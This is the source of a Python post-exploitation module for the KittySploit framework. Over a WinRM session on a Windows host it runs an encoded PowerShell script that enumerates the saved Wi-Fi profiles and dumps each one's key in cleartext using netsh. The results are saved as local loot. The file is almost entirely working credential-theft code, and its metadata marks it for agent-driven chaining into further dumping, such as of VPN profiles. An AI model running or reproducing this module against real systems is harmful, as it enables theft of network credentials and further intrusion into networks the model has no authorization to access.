#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin
import re


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Gather WiFi Keys",
		"description": "Extract saved WLAN profile PSKs via netsh over a WinRM session",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1555/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 3,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["wifi_creds"],
				"suggested_followups": ["post/winrm/gather/dump_vpn_profiles"],
			},
		},
	}

	save_local = OptBool(True, "Save results under ./output", False)

	def _script(self) -> str:
		return r"""
$profileLines = netsh wlan show profiles 2>&1
$profileNames = $profileLines | Where-Object {
  $_ -match 'All User Profile|Profil Tous les utilisateurs|Perfil de todos los usuarios|Benutzerprofil'
} | ForEach-Object {
  if ($_ -match ':\s*(.+)\s*$') { $matches[1].Trim() }
} | Where-Object { $_ }

if (-not $profileNames) {
  Write-Output 'No saved WiFi profiles found for the current user.'
  return
}

$sections = New-Object System.Collections.Generic.List[string]
foreach ($network in $profileNames) {
  $detail = netsh wlan show profile name="$network" key=clear 2>&1
  $sections.Add("=== Profile: $network ===`n$detail")
}
$sections -join "`n`n"
"""

	def run(self):
		try:
			print_status("Extracting saved WiFi profile keys over WinRM...")
			result = self.winrm_run_encoded_ps(self._script())
			if not result:
				raise ProcedureError(FailureType.Unknown, "No output returned")
			if re.search(r"No saved WiFi profiles found", result, re.I):
				print_warning(result)
				return True
			if self._bool_opt(self.save_local, True):
				path = self.winrm_save_loot(result, "winrm_wifi_keys")
				print_success(f"Saved to ./{path}")
			print_success("WiFi key extraction completed")
			print_info(result)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM WiFi dump error: {exc}")
